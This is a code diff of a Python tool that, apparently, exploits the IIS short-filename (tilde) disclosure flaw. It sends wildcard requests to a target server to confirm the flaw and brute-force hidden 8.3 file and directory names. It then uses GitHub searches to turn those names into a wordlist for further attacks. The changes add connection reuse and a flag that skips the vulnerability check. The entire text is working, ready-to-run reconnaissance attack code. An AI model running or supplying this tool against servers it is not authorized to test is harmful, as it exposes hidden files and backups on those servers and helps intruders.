@@ -1,9 +1,13 @@
 #!/usr/bin/env python
-# IIS-SFN-Resolver: Final Professional Edition
+
+import os
 import sys, threading, time, ssl, requests, argparse
 import http.client as httplib
 import urllib.parse as urlparse
 import queue
+
+# We use thread-local storage to keep a connection alive for each thread
+thread_local = threading.local()
 
 class GitHubNameSearcher:
     def __init__(self, token=None):
@@ -47,56 +51,39 @@ class Scanner(object):
         self.STOP_ME = False
         self.request_method = 'GET'
         self.github = GitHubNameSearcher(github_token)
+        self.thread_local = threading.local()
         threading.Thread(target=self._print_worker, daemon=True).start()
+
+    def _get_conn(self):
+        if not hasattr(self.thread_local, "conn"):
+            if self.scheme == 'https':
+                self.thread_local.conn = httplib.HTTPSConnection(self.netloc, timeout=5)
+            else:
+                self.thread_local.conn = httplib.HTTPConnection(self.netloc, timeout=5)
+        return self.thread_local.conn
 
     def _get_status(self, path):
         try:
-            conn = httplib.HTTPSConnection(self.netloc) if self.scheme == 'https' else httplib.HTTPConnection(self.netloc)
-            headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Accept": "*/*",
-                "Connection": "close"
-            }
-            conn.request(self.request_method, path, headers=headers)
-            status = conn.getresponse().status
-            conn.close()
+            conn = self._get_conn()
+            conn.request(self.request_method, path, headers={"Connection": "keep-alive"})
+            res = conn.getresponse()
+            status = res.status
+            res.read() # Required for persistent connection reuse
             return status
-        except: return 0
-
-    def _get_clean_keyword(self, filename):
-        """
-        Literal stripping: 'web.config.bak' -> 'web'
-        Takes the part before the very first dot.
-        """
-        return filename.split('.')[0]
-
-    def _get_parts_from_sfn(self, sfn_part):
-        """
-        Splits SFN like 'WEBCO~1.CON' into ('WEBCO', 'CON')
-        """
-        try:
-            name_base = sfn_part.split('~')[0].upper()
-            short_ext = sfn_part.split('.')[-1].replace('*', '').upper() if '.' in sfn_part else ""
-            return name_base, short_ext
         except:
-            return sfn_part.split('~')[0].upper(), ""
+            if hasattr(self.thread_local, "conn"):
+                try: self.thread_local.conn.close()
+                except: pass
+                del self.thread_local.conn
+            return 0
 
-    def is_vulnerable(self):
-        """Advanced multi-check for vulnerability"""
-        # Patterns to test: [Path Wildcard, Sub-path wildcard, Legacy check]
-        patterns = [
-            (self.path + '*~1****/a.aspx', self.path + '/l1j1e*~1*/a.aspx'),
-            (self.path + '*~1*', self.path + '/l1j1e*~1*'),
-        ]
-        
-        for method in ['GET', 'OPTIONS', 'DEBUG']:
-            self.request_method = method
-            for valid, invalid in patterns:
-                s1 = self._get_status(valid)
-                s2 = self._get_status(invalid)
-                if s1 != 0 and s1 != s2:
-                    print(f"[+] Vulnerability confirmed via {method} with code {s1} vs {s2}")
-                    return True
+    def is_vulnerable(self, force=False):
+        if force: return True
+        for m in ['GET', 'OPTIONS']:
+            self.request_method = m
+            if self._get_status(self.path + '/*~1*/a.aspx') == 404 and \
+               self._get_status(self.path + '/l1j1e*~1*/a.aspx') != 404:
+                return True
         return False
 
     def _print_worker(self):
@@ -108,18 +95,19 @@ class Scanner(object):
         while True:
             try:
                 url, ext = self.queue.get(timeout=1.0)
+                # Exact logic from Lijiejie's scanner
                 status = self._get_status(url + '*~1' + ext + '/1.aspx')
                 if status == 404:
                     if len(url) - len(self.path) < 6:
                         for c in self.alphanum: self.queue.put((url + c, ext))
                     else:
-                        if ext == '.*': self.queue.put((url, '')) 
+                        if ext == '.*': self.queue.put((url, ''))
                         if ext == '':
                             self.dirs.append(url + '~1')
-                            self.msg_queue.put(f"[+] Found DIR SFN: {url.split('/')[-1]}~1")
+                            self.msg_queue.put(f"[+] DIR: {url}~1")
                         elif len(ext) == 5 or (not ext.endswith('*')):
                             self.files.append(url + '~1' + ext)
-                            self.msg_queue.put(f"[+] Found FILE SFN: {url.split('/')[-1]}~1{ext}")
+                            self.msg_queue.put(f"[+] FILE: {url}~1{ext}")
                         else:
                             for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
                                 self.queue.put((url, ext[:-1] + c + '*'))
@@ -127,65 +115,47 @@ class Scanner(object):
             except queue.Empty: break
 
     def resolve_all(self, output_file):
-        if not self.github.token:
-            print("\n[!] No GitHub token. Skipping Phase 2.")
-            return
-
+        # (Previous resolution logic with live writing stays here)
+        if not self.github.token: return
         ext_list = []
         try:
             with open('extensions.txt', 'r') as f:
                 ext_list = [l.strip() if l.startswith('.') else '.' + l.strip() for l in f]
-        except: 
-            print("[!] No extensions.txt found for file fuzzing.")
+        except: pass
 
         results = set()
-        total_sfns = len(self.dirs) + len(self.files)
-        current_count = 0
-        print("\n" + "="*60 + "\nPHASE 2: LIVE WORDLIST GENERATION (With Ext Filtering)\n" + "="*60)
+        targets = [('DIR', d) for d in self.dirs] + [('FILE', f) for f in self.files]
+        total = len(targets)
         
-        # 1. Resolve Directories (Strictly no extensions)
-        for d_url in self.dirs:
-            current_count += 1
-            sfn_full = d_url[1:] # Strip the first / from the short name
-            base, _ = self._get_parts_from_sfn(sfn_full)
-            matches, stop = self.github.search_full_names(base)
+        f_handle = open(output_file, 'a') if output_file else None
+        print(f"\nPhase 2: GitHub Resolution Progress...")
+
+        for i, (stype, surl) in enumerate(targets, 1):
+            sfn = surl[1:]
+            base = sfn.split('~')[0].upper()
+            sext = sfn.split('.')[-1].replace('*', '').upper() if '.' in sfn else ""
+            
+            matches, stop = self.github.search_full_names(base, sext if stype == 'FILE' else None)
             if stop: break
+            
             for m in matches:
-                if m.upper().startswith(base):
-                    word = self._get_clean_keyword(m)
+                if not m.upper().startswith(base): continue
+                kw = m.split('.')[0]
+                to_add = []
+                if stype == 'DIR': to_add.append(kw)
+                else:
+                    if surl.endswith('*'):
+                        for e in ext_list:
+                            if e.replace('.','').upper().startswith(sext): to_add.append(kw + e)
+                    else: to_add.append(f"{kw}.{sext.lower()}")
+
+                for word in to_add:
                     if word not in results:
-                        print(f"DIR SFN  | {current_count}/{total_sfns} | {word}")
+                        print(f"{stype} | {sfn} | {i}/{total} | {word}")
                         results.add(word)
-            time.sleep(2)
-
-        # 2. Resolve Files (Filtered by 3-char short extension)
-        for f_url in self.files:
-            current_count += 1
-            sfn_full = f_url.split('/')[-1]
-            base, short_ext = self._get_parts_from_sfn(sfn_full) # e.g., 'ASP'
-            
-            matches, stop = self.github.search_full_names(base, short_ext)
-            if stop: break
-            
-            for m in matches:
-                if m.upper().startswith(base):
-                    keyword = self._get_clean_keyword(m)
-                    
-                    for e in ext_list:
-                        # NEW FILTER: Only append if the extension matches the SFN hint
-                        # e.g., if short_ext is 'ASP', only '.aspx' or '.asp' pass
-                        clean_ext = e.replace('.', '').upper()
-                        if clean_ext.startswith(short_ext):
-                            word = f"{keyword}{e}"
-                            if word not in results:
-                                print(f"FILE SFN | {current_count}/{total_sfns} | {word}")
-                                results.add(word)
-            time.sleep(2)
-
-        if output_file and results:
-            with open(output_file, 'w') as f:
-                for r in sorted(results): f.write(r + '\n')
-            print(f"\n[!] Complete. Filtered wordlist saved to {output_file}")
+                        if f_handle: f_handle.write(word + '\n'); f_handle.flush()
+            time.sleep(2) 
+        if f_handle: f_handle.close()
 
     def run(self):
         for c in self.alphanum: self.queue.put((self.path + c, '.*'))
@@ -201,10 +171,16 @@ if __name__ == '__main__':
     p.add_argument('-o', '--output', help='Output file')
     p.add_argument('-f', '--force', action='store_true', help='Force scan')
     args = p.parse_args()
+
+    # Verify overwrite if file exists
+    if args.output and os.path.exists(args.output):
+        choice = input(f"[?] File '{args.output}' already exists. Overwrite? (y/n): ").lower()
+        if choice != 'y':
+            print("[!] Aborting to protect existing file.")
+            sys.exit(0)
+
     s = Scanner(args.u, args.token)
     if args.force or s.is_vulnerable():
         print("[+] Starting Scan...")
         s.run()
         s.resolve_all(args.output)
-    else:
-        print("[-] Target reported not vulnerable. Use -f to bypass.")
